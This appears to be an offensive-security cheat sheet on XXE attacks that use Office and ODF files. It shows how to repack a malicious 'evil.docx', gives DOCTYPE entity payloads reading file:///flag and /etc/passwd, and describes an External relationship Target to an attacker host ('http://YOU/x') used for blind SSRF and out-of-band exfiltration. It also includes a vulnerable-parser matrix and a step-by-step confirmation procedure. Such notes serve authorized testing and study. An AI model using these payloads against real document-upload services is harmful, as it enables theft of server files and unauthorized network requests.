# OOXML XXE — DOCX/XLSX/PPTX as ZIP containers of XML

## The structure — every Office file is a ZIP of XML parts

```
docx: [Content_Types].xml  _rels/.rels  word/document.xml
      word/_rels/document.xml.rels  word/styles.xml  docProps/*.xml
xlsx: xl/workbook.xml xl/worksheets/sheet1.xml xl/sharedStrings.xml
      xl/_rels/workbook.xml.rels
pptx: ppt/presentation.xml ppt/slides/slide1.xml ppt/_rels/...
odt:  content.xml  meta.xml  styles.xml  META-INF/manifest.xml
```

Any part parsed by the office-doc library is a potential XXE surface —
inject entities into whichever part the app's parser touches.

## The injection method — edit a part inside the ZIP

```bash
unzip doc.docx -d docx/                # extract
# edit word/document.xml — add DOCTYPE + entity
cd docx && zip -r ../evil.docx .       # repack — mimetype order matters
```

For ODF (`odt`/`ods`) — the `mimetype` file must be FIRST and stored
uncompressed — repack with `zip` adding `mimetype` first:

```bash
cd odt && zip -0 -X ../evil.odt mimetype && zip -r ../evil.odt . -x mimetype
```

For OOXML (docx/xlsx) — no special first-file requirement — simple
repack works.

## The document.xml injection — inline entity in body text

```xml
<w:document ...>
<w:body>
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:body>
</w:document>
```

with a DOCTYPE prepended to `word/document.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///flag">]>
```

When the app extracts text from the docx (a "preview"/"search"/"index"
feature) — `&xxe;` expands into the extracted text → in-band read.

## The sharedStrings.xml path — XLSX text-store

`xl/sharedStrings.xml` holds every string cell — inject `<!ENTITY>`
into it + reference `&x;` in a `<t>` element — the string table shows
up wherever the app displays cell text.

## The rels-file trick — `.rels` files hold TARGET URLs

`word/_rels/document.xml.rels` declares external targets:

```xml
<Relationship Id="rId9" Type=".../hyperlink" Target="http://YOU/x" TargetMode="External"/>
```

Referenced by an `r:embed`/`r:id` in the doc — the parser fetches the
Target — blind-SSRF/OOB channel — no DOCTYPE needed.

## The macro/script parts — `vbaProject.bin` etc.

Not XML — different surface — skip for XXE.

## The parser matrix — what parses OOXML

| App function | Parser | XXE likely? |
|---|---|---|
| "preview" docx→html | Apache POI / python-docx / OpenXML SDK | POI historically yes |
| text extraction | POI `XWPFWordExtractor` / python-docx / `docx2txt` | depends on factory config |
| XLSX cell-read | Apache POI `XSSFReader`/`SAXReader` | SAX path yes if entities on |
| LibreOffice headless convert | internal parser | usually hardened |
| MS Office | MSXML/System.Xml | hardened by default |

## The targeted parsers — per-stack notes

- **Apache POI** (Java) — uses `XMLReader`/`DocumentBuilderFactory` —
  default in older POI resolves entities — the classic XXE vector
- **python-docx / python-pptx** — lxml-based — lxml default = NO
  network entities but `no_network=False`/resolve_entities on → live
- **python openpyxl** — ElementTree — defused? ElementTree default
  resolves internal entities only — external off unless lxml
- **ClosedXML / OpenXML SDK (.NET)** — `XmlReader` default since 4.5 =
  `DtdProcessing.Prohibit` → DOCTYPE refused — the `.rels` URL-fetch
  still works in some paths
- **LibreOffice headless** — entities off by default in modern builds

## The "upload → parse → display" confirmation

1. Upload a legit docx — find the feature that renders its text back
   (preview, search-results, extracted-text display)
2. Re-upload with `&xxe;` entity in `word/document.xml` pointed at
   `file:///etc/passwd`
3. The rendered text contains `/etc/passwd` contents → confirmed

## The blind variant — entity inside rels/DTD → OOB

Put the param-entity external-DTD payload in `document.xml`'s DOCTYPE
— the parser fetches your DTD → OOB exfil — `blind-xxe.md`.

## Falsifiers

- the parser strips DOCTYPE / Prohibit-DTD → XInclude won't help in
  OOXML parts (XInclude isn't enabled in OOXML pipelines) → the `.rels`
  external-target trick is the fallback

## Output to record

- which part carried the entity + which app-feature surfaced it + the
  verbatim read
